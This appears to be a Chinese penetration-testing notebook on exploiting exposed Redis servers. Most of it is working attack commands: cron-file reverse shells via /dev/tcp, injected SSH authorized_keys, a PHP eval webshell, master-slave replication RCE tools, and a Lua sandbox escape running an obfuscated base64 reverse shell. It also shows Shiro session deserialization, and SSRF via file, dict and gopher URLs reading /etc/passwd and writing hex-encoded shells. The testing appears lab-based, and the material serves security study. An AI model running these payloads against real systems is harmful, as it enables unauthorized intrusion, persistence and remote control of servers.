# Redis客户端

```
sudo apt update
sudo apt install redis-tools
---
gui
https://github.com/qishibo/AnotherRedisDesktopManager

redis-cli -h 127.0.0.1
```

![](https://img.mi3aka.eu.org/2022/08/a1244184910709658599795a50317189.png)

`redis-cli -h your_host -p 6379 -a "pass" --raw`

`-h` 远程连接的主机

`-p` 远程连接的端口

`-a` 密码

`--raw` 解决中文乱码

# 计划任务反弹shell

```
#反弹shell
set getshell "\n* * * * * bash -i >& /dev/tcp/ip/7000 0>&1\n"
#计划任务路径 ubuntu/debian
config set dir /etc/cron.d
#保存为test文件
config set dbfilename test
#保存
save
```

![](https://img.mi3aka.eu.org/2022/08/8fbe7a6b8aeabf44cd824d24412030fb.png)

![](https://img.mi3aka.eu.org/2022/08/f7263ca7275e6ad8b8fa62877ef8bdba.png)

![](https://img.mi3aka.eu.org/2022/08/e75f82a956bdf1bc2b90f1904ecead3e.png)

>无法正常反弹原因

计划任务中存在乱码，也就是这些乱码导致计划任务执行错误。
这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。

# 写入ssh公钥

```
set sshpubkey "\n\nssh-rsa AAAAB3Nzaxxx\n\n"

config set dir /root/.ssh

config set dbfilename authorized_keys

save
```

![](https://img.mi3aka.eu.org/2022/08/cb1a6d3734c8f4506001219f2b49c775.png)

![](https://img.mi3aka.eu.org/2022/08/b835023633794da2ed81ddb461e8ae69.png)

# 写入webshell

```
config set dir /var/www/html/
config set dbfilename webshell.php
set x '<?php @eval($_GET["cmd"]);phpinfo();?>'
save
```

# Redis主从复制导致的命令执行

影响版本4.x-5.x

1. 生成恶意so文件

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand/
make
```

2. 漏洞利用

[https://github.com/Ridter/redis-rce](https://github.com/Ridter/redis-rce)

`python redis-rce.py -r 目标ip -p 目标端口 -L 本地ip -f 恶意.so`

>这里使用的vulhub的复现镜像,注意目标ip填写127.0.0.1,本地ip填写docker0的网卡ip,如果本地ip填写127.0.0.1会导致监听的端口建立在宿主机,但容器反弹到的确实容器内部的端口

![](https://img.mi3aka.eu.org/2022/08/a9fcc7704b3781c0a8702f77d7538774.png)

![](https://img.mi3aka.eu.org/2022/08/1bd6db5b5c38cc62dab1ac66277b39e9.png)

---

直接利用

[https://github.com/n0b0dyCN/redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server)

[https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)

# Redis Lua沙盒绕过命令执行

>借助Lua沙箱中遗留的变量`package`的`loadlib`函数来加载动态链接库`/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`里的导出函数`luaopen_io`,在Lua中执行这个导出函数,即可获得`io`库,再使用其执行命令

```
127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
"uid=0(root) gid=0(root) groups=0(root)\n"

127.0.0.1:6379> eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("echo c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS83MDAwIDA+JjEK | base64 -d | bash -i", "r"); local res = f:read("*a"); f:close(); return res' 0
```

![](https://img.mi3aka.eu.org/2022/08/8b97ccdf972f11fa444193aefc127c16.png)

# Redis未授权到shiro反序列化

[https://xz.aliyun.com/t/11198](https://xz.aliyun.com/t/11198)

```
docker pull redis:3.2
docker run -dit -p 6379:6379 redis:3.2
git clone https://github.com/alexxiyang/shiro-redis-spring-boot-tutorial.git
运行ShiroRedisSpringBootTutorialApplication.java
```

![](https://img.mi3aka.eu.org/2022/08/8045107933ec8e68ad0e58ef9a167f2f.png)

![](https://img.mi3aka.eu.org/2022/08/0542ef5c27f797a27ac297516cf2b8a3.png)

`\xac\xed`原始序列化数据开头,尝试利用redis中的session进行反序列化攻击

![](https://img.mi3aka.eu.org/2022/08/dec200f40d2dab5aabb802c811131d3e.png)

利用脚本将`raw.txt`转换成`\x00`的形式

>如果直接print(raw)会直接输出`\n\r`等字符,破坏利用链

```python
with open('raw.txt','rb') as f:
    raw=f.read()
for i in raw:
    print(r'\x',str(hex(i))[2:].zfill(2),end="",sep="")
```

将输出的结果复制到Redis中以Hex格式保存即可,保存后会自动转换

![](https://img.mi3aka.eu.org/2022/08/f3b92533c3be2abe2471027cf2f1fb2e.png)

![](https://img.mi3aka.eu.org/2022/08/00e38a2a7884570ecf5321348fb51473.png)

修改cookie并重新发包

![](https://img.mi3aka.eu.org/2022/08/f49f37702b9537dcb50c9dab9f8c741a.png)

成功执行命令

![](https://img.mi3aka.eu.org/2022/08/34ca5ef684b7d3044898b8e0eb765f31.png)

在`org.crazycake.shiro.RedisSessionDAO#doReadSession`中

```java
    protected Session doReadSession(Serializable sessionId) {
        if (this.sessionInMemoryEnabled) {
            this.removeExpiredSessionInMemory();
        }

        if (sessionId == null) {
            logger.warn("session id is null");
            return null;
        } else {
            Session session;
            if (this.sessionInMemoryEnabled) {
                session = this.getSessionFromThreadLocal(sessionId);
                if (session != null) {
                    return session;
                }
            }

            session = null;

            try {
                String sessionRedisKey = this.getRedisSessionKey(sessionId);
                logger.debug("read session: " + sessionRedisKey + " from Redis");
                session = (Session)this.valueSerializer.deserialize(this.redisManager.get(this.keySerializer.serialize(sessionRedisKey)));//这里从redis中读取session对应的序列化数据并进行反序列化
                if (this.sessionInMemoryEnabled) {
                    this.setSessionToThreadLocal(sessionId, session);
                }
            } catch (SerializationException var4) {
                logger.error("read session error. sessionId: " + sessionId);
            }

            return session;
        }
    }
```

# SSRF-Redis

```
redis登录后临时修改密码
config set requirepass 123456
```

```php
<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
?>
```

## http协议

`?url=http://httpbin.org/get`

![](https://img.mi3aka.eu.org/2022/09/50781955f2026fae0ed3232cb86ec775.png)

## file协议

`?url=file:///etc/passwd`

![](https://img.mi3aka.eu.org/2022/09/1f89037b77aa5fa68aca85981816e17b.png)

## dict协议

`?url=dic://ip:port/info`查看当前redis的相关配置

![](https://img.mi3aka.eu.org/2022/09/12556d9b5aba426f39a018259c821e29.png)

>如果提示`NOAUTH Authentication required`则说明需要密码

![](https://img.mi3aka.eu.org/2022/09/374c5d41904f6c7c8bd73c88fbce4e79.png)

![](https://img.mi3aka.eu.org/2022/09/d0c59e91d2224a54d6c0d4bace65a187.png)

对于存在认证的redis无法利用dict协议进行攻击,因为dict每次只能传输单行数据(单条完整指令)

---

>攻击链条如下

1. 写webshell

```
flushall
config set dir /tmp
config set dbfilename shell.php
set:webshell:"\x3C\x3fphp\x20phpinfo\x28\x29\x3b\x3f\x3e"
用\x3f代替?避免写入出错
save
```

![](https://img.mi3aka.eu.org/2022/09/11cfa900e3cf423bac805391e4a65917.png)

![](https://img.mi3aka.eu.org/2022/09/5f6840bad2e6365f0e3a2a334e340e12.png)

2. 反弹shell

```
flushall
config set dir /etc/cron.d
config set dbfilename re
set:a:"\n\n\x2a/1 \x2a \x2a \x2a \x2a root /bin/bash -i \x3e\x26 /dev/tcp/ip/port 0\x3e\x261\n\n"
save
```

![](https://img.mi3aka.eu.org/2022/09/240d207dc87560d255b27a81642b125e.png)

>vulhub的redis都是基于debian的,只有centos的cron能够无视错误语句运行

3. 主从复制

>todo

## gopher协议

1. 协议格式

格式里面的特殊字符'_'不一定是它也可以是其他特殊字符,因为gopher协议默认会吃掉一个字符
`gopher://<host>:<port>/<gopher-path>_`后接TCP数据流

如果发起post请求,回车换行需要使用`%0d%0a`,如果存在多个参数,参数之间的`&`也需要进行URL编码

2. 协议通信

![](https://img.mi3aka.eu.org/2022/09/31a0defb4141aa37ab7218a9788d6c82.png)

